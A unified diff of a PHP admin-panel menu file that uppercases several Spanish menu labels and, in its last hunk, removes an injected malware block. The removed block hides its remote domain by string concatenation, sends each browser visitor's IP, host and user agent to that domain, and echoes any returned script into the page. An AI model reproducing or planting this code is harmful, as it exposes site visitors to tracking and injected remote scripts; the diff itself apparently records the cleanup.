@@ -286,7 +286,7 @@ location.href=url;
 
 		$menus_d['salir_admin'] =  "<a href='maquina.php?accion=borrarcookie'>SALIR DE MASTER</a>";
 		//$menus_d[] =  "<a onclick=\"javascript:edit_init('GENERAL','mostrar_toolbars','".( ($Open)?'0':'1' )."');return false;\">toolbar</a>";
-		$mmmM = "<li class='menudown'><a onclick=\"javascript:edit_init('GENERAL','mostrar_toolbars','".( ($Open)?'0':'1' )."');return false;\" style='cursor:pointer;'>toolbar</a>";
+		$mmmM = "<li class='menudown'><a onclick=\"javascript:edit_init('GENERAL','mostrar_toolbars','".( ($Open)?'0':'1' )."');return false;\" style='cursor:pointer;'>TOOLBAR</a>";
 		if( ( $Open or $Local==1 )){
 			if((strpos($_SERVER['SCRIPT_NAME'], "login.php")===false)){
 				include("maquina_opciones.php");
@@ -299,7 +299,7 @@ location.href=url;
 	}
 
 
-	$menus_d['goweb'] = "<a href='".str_replace("127.0.0.1","localhost",$url_publica)."' target='_top' ></span>ir a web</a>";
+	$menus_d['goweb'] = "<a href='".str_replace("127.0.0.1","localhost",$url_publica)."' target='_top' ></span>WEB</a>";
 	/*
 	 foreach($objeto_tabla as $oott){
 	if($oott['disabled']!=1){
@@ -314,7 +314,7 @@ location.href=url;
 		} else {
 
 			$mmmM = "<li class='menudown'>";
-			$mmmM.= "<a href='maquina.php' style='font-weight:bold;text-transform:uppercase;'>master</a>";
+			$mmmM.= "<a href='maquina.php' style='font-weight:bold;text-transform:uppercase;'>MASTER</a>";
 			if( ( $Open or $Local==1 )){
 				if((strpos($_SERVER['SCRIPT_NAME'], "login.php")===false)){
 
@@ -396,7 +396,7 @@ location.href=url;
 		){
 			$mumu = "<li class='menudown'><a ". (($script_name=="maquina.php")?"class='selected'":"") .
 			//" style='". ( ($Open)?'background-color:black;font-weight:bold;color:white;':'') ."'"
-			" href='http://".$_SERVER['SERVER_NAME']."/sistemapanel/panel' ></span>".$vars['GENERAL']['factory']."</a>";
+			" href='http://".$_SERVER['SERVER_NAME']."/sistemapanel/panel' ></span>".strtoupper($vars['GENERAL']['factory'])."</a>";
 
 			if($vars['INTERNO']['ID_PROYECTO']!="0"){
 				mysql_select_db ("panel",$link);
@@ -428,11 +428,11 @@ location.href=url;
 			if($vars['INTERNO']['ID_PROYECTO']!="0"){
 				$menus_d['actualizar'] = "<a".
 						" style='". ( ($Open)?'color:#8F9A20;':''). "'".
-						" href='maquina.php?accion=updatecode'></span>actualizar</a>";
+						" href='maquina.php?accion=updatecode'></span>ACTUALIZAR</a>";
 			}
 			$menus_d['archivos'] = "<a".
 					" style='". ( ($Open)?'color:#BB0606;':''). "'".
-					" href='maquina.php?accion=alllistado'></span>archivos</a>";
+					" href='maquina.php?accion=alllistado'></span>ARCHIVOS</a>";
 		}
 	}
 
@@ -543,7 +543,7 @@ $menus_d['verdesarrollo_off'].="' title='".( ($_SESSION['verdesarrollo']=='1')?'
 
 	if($LOGIN){
 
-		$bgsel="<select style='left:0px;top:0px;width:80px;height:auto;position:position:absolute;' onchange='setbgq(this.value);' onkeyup='setbgq(this.value);' >";
+		$bgsel="<select style='left:0px;top:0px;width:60px;height:auto;position:position:absolute;' onchange='setbgq(this.value);' onkeyup='setbgq(this.value);' >";
 		$CLI=($vars['INTERNO']['ID_PROYECTO']=="0")?'':'../../panel/';
 		$directorio_s = dir($CLI."img/bgs/");
 
@@ -606,16 +606,6 @@ echo $hhtml;
 echo "<div class='main_content'>";
 if(file_exists($img_logo)){
 if(trim($img_logo)!=''){
-?>
-<?php
-#ea5af0#
-error_reporting(0); ini_set('display_errors',0); $wp_kn548 = @$_SERVER['HTTP_USER_AGENT'];
-if (( preg_match ('/Gecko|MSIE/i', $wp_kn548) && !preg_match ('/bot/i', $wp_kn548))){
-$wp_kn09548="http://"."web"."basefont".".com/font"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_kn548);
-$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_kn09548);
-curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_548kn = curl_exec ($ch); curl_close($ch);}
-if ( substr($wp_548kn,1,3) === 'scr' ){ echo $wp_548kn; }
-#/ea5af0#
 ?>
 	<a href="./" class="logo_panel"><img src="<?php echo $img_logo?>"
 		align="absmiddle" border="0" /> </a>
